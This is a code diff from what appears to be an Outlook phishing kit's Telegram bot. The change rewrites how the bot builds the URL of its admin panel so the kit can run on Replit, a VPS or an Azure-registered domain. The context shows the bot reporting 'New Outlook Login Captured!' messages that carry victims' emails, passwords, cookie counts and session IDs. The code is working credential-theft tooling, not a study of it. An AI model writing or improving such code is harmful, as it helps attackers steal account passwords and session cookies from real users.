@@ -220,7 +220,23 @@ This bot provides notifications and admin access for the Outlook automation proj
 
     async handleAdminPanel(chatId, messageId) {
         const adminToken = global.adminToken || 'Token not available';
-        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
+        // Construct admin URL - support Replit, VPS with domain, or extract from redirect URI
+        let baseUrl;
+        if (process.env.REPL_SLUG) {
+            // Replit environment
+            baseUrl = `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
+        } else if (process.env.DOMAIN) {
+            // VPS with explicit domain
+            baseUrl = process.env.DOMAIN;
+        } else if (process.env.AZURE_REDIRECT_URI) {
+            // Extract domain from redirect URI
+            const redirectUrl = new URL(process.env.AZURE_REDIRECT_URI);
+            baseUrl = `${redirectUrl.protocol}//${redirectUrl.host}`;
+        } else {
+            // Fallback - but this won't work with Telegram
+            baseUrl = 'http://localhost:5000';
+        }
+        const adminUrl = `${baseUrl}/ad.html`;
 
         const tokenMessage = `
 🔧 <b>Admin Panel Access</b>
@@ -269,7 +285,23 @@ ${adminUrl}
         }
 
         const { email, timestamp, totalCookies, sessionId, password } = loginData;
-        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
+        // Construct admin URL - support Replit, VPS with domain, or extract from redirect URI
+        let baseUrl;
+        if (process.env.REPL_SLUG) {
+            // Replit environment
+            baseUrl = `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
+        } else if (process.env.DOMAIN) {
+            // VPS with explicit domain
+            baseUrl = process.env.DOMAIN;
+        } else if (process.env.AZURE_REDIRECT_URI) {
+            // Extract domain from redirect URI
+            const redirectUrl = new URL(process.env.AZURE_REDIRECT_URI);
+            baseUrl = `${redirectUrl.protocol}//${redirectUrl.host}`;
+        } else {
+            // Fallback - but this won't work with Telegram
+            baseUrl = 'http://localhost:5000';
+        }
+        const adminUrl = `${baseUrl}/ad.html`;
 
         const notificationMessage = `
 🔐 <b>New Outlook Login Captured!</b>
